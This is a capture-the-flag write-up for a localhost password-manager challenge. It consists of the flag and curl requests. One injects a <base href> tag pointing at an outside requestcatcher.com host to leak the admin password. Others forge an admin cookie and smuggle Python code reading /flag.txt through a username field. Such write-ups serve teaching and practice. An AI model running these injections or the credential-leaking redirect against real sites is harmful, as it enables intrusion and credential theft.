### flag
`icc{Pefect_Plaintext_Password_Protection_Package_313370nG0nG}`

### Solution
guest login

```jsx
curl --path-as-is -i -s -k -X 'POST' -H 'Content-Type: application/x-www-form-urlencoded'  --data-binary 'username=guest&hash=Z3Vlc3QsZnVuY3Rpb24gcmFuZG9tQnl0ZXMoc2l6ZSwgY2FsbGJhY2spIHsKICBzaXplID0gYXNzZXJ0U2l6ZShzaXplLCAxLCAwLCBJbmZpbml0eSk7CiAgaWYgKGNhbGxiYWNrICE9PSB1bmRlZmluZWQpIHsKICAgIHZhbGlkYXRlRnVuY3Rpb24oY2FsbGJhY2ssICdjYWxsYmFjaycpOwogIH0KCiAgY29uc3QgYnVmID0gbmV3IEZhc3RCdWZmZXIoc2l6ZSk7CgogIGlmIChjYWxsYmFjayA9PT0gdW5kZWZpbmVkKSB7CiAgICByYW5kb21GaWxsU3luYyhidWYuYnVmZmVyLCAwLCBzaXplKTsKICAgIHJldHVybiBidWY7CiAgfQoKICAvLyBLZWVwIHRoZSBjYWxsYmFjayBhcyBhIHJlZ3VsYXIgZnVuY3Rpb24gc28gdGhpcyBpcyBwcm9wYWdhdGVkLgogIHJhbmRvbUZpbGwoYnVmLmJ1ZmZlciwgMCwgc2l6ZSwgZnVuY3Rpb24oZXJyb3IpIHsKICAgIGlmIChlcnJvcikgcmV0dXJuIEZ1bmN0aW9uUHJvdG90eXBlQ2FsbChjYWxsYmFjaywgdGhpcywgZXJyb3IpOwogICAgRnVuY3Rpb25Qcm90b3R5cGVDYWxsKGNhbGxiYWNrLCB0aGlzLCBudWxsLCBidWYpOwogIH0pOwp9LGd1ZXN0cGFzc3dvcmQsMSwzLDMsNw==' 'http://localhost:3000/login'
```

add motd

```jsx
curl --path-as-is -i -s -k -X 'POST' \
    -H 'Content-Type: application/x-www-form-urlencoded' -H 'Content-Length: 66' \
    -b 'hash=Z3Vlc3QsZnVuY3Rpb24gcmFuZG9tQnl0ZXMoc2l6ZSwgY2FsbGJhY2spIHsKICBzaXplID0gYXNzZXJ0U2l6ZShzaXplLCAxLCAwLCBJbmZpbml0eSk7CiAgaWYgKGNhbGxiYWNrICE9PSB1bmRlZmluZWQpIHsKICAgIHZhbGlkYXRlRnVuY3Rpb24oY2FsbGJhY2ssICdjYWxsYmFjaycpOwogIH0KCiAgY29uc3QgYnVmID0gbmV3IEZhc3RCdWZmZXIoc2l6ZSk7CgogIGlmIChjYWxsYmFjayA9PT0gdW5kZWZpbmVkKSB7CiAgICByYW5kb21GaWxsU3luYyhidWYuYnVmZmVyLCAwLCBzaXplKTsKICAgIHJldHVybiBidWY7CiAgfQoKICAvLyBLZWVwIHRoZSBjYWxsYmFjayBhcyBhIHJlZ3VsYXIgZnVuY3Rpb24gc28gdGhpcyBpcyBwcm9wYWdhdGVkLgogIHJhbmRvbUZpbGwoYnVmLmJ1ZmZlciwgMCwgc2l6ZSwgZnVuY3Rpb24oZXJyb3IpIHsKICAgIGlmIChlcnJvcikgcmV0dXJuIEZ1bmN0aW9uUHJvdG90eXBlQ2FsbChjYWxsYmFjaywgdGhpcywgZXJyb3IpOwogICAgRnVuY3Rpb25Qcm90b3R5cGVDYWxsKGNhbGxiYWNrLCB0aGlzLCBudWxsLCBidWYpOwogIH0pOwp9LGd1ZXN0cGFzc3dvcmQsMSwzLDMsNw%3D%3D' \
    --data-binary 'message=wow&message=<base+href=\'https://ppppp.requestcatcher.com\'>' \
    'http://localhost:3000/add-motd'
```

report, get admin password

```jsx
String.prototype.toBase64 = function() {
    return Buffer.from(this).toString('base64')
}
['admin','<<supersecretpassword>>'].join().toBase64()
```

add password

```jsx
POST /add-password HTTP/1.1
Host: localhost:3000
Content-Length: 188
Content-Type: application/json
Cookie: hash=YWRtaW4sPDxzdXBlcnNlY3JldHBhc3N3b3JkPj4=

{"username":"\ndef view_password():\n\treturn open('/flag.txt').read()#","password":"password","url":"http://google.com","filename":"passwords.txt","filename\ud800": "password_manager.py"}
```

then go to view password, get flag
